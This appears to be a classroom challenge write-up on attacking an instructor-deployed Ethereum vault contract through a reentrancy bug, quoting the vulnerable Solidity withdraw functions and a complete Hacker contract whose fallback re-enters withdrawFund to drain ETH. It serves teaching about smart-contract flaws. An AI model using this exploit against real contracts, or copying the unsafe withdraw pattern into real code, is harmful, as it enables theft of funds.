### challenge: try to hack deployed contract and withdraw ETH fund!

Instructor deployed a contract at 0x6bf109EB4166fd72f4CA2EcCa8987d00Fb8B3750. We are trying to attack it by leveraging the re-entry bug as shown in the below:

```solidity
function basicWithdraw(address dst) internal returns (bool) {
    require(this.balance >= 0.0005 ether);
    bool res = dst.call.value(0.0005 ether)();
    return res;
}
    
function withdrawFund(address dst) onlyAuthorized external returns (bool) {
        require(now > nextWithdrawTime);
        assert(withdrawObserver.call(bytes4(sha3("observe()"))));
        bool res = basicWithdraw(dst);
        nextWithdrawTime = nextWithdrawTime + withdrawCoolDownTime;
        return res;
    }
```
Here **basicWithdraw** used "call" method to withdraw money, which will continue to execute even though result value is false. It is an unsafe function to use. Much worse, **withdrawFund** function modified the nextWithdrawTime after calling basicWithdraw, so that it will never have chance to change nextWithdrawTime if program keeps re-entering the withdrawFund/basicWithdraw function! Therefore, attacker can keep withdrawing funds from the contract!

Here is the attacker function. It has a fallback function that keeps calling withdrawFund 10 times, therefore, causing re-entry error.
```solidity
contract Hacker {
    
    TimeDelayedVault ba;
    uint public stack = 0;
    
    function Hacker(address baAddress) {
        ba = TimeDelayedVault(baAddress);
    }
    
    function attack() {
        ba.withdrawFund(this);
    }
    
    function() payable {
        if (stack++ < 10) {
            ba.withdrawFund(this);
        }
    }
}
```
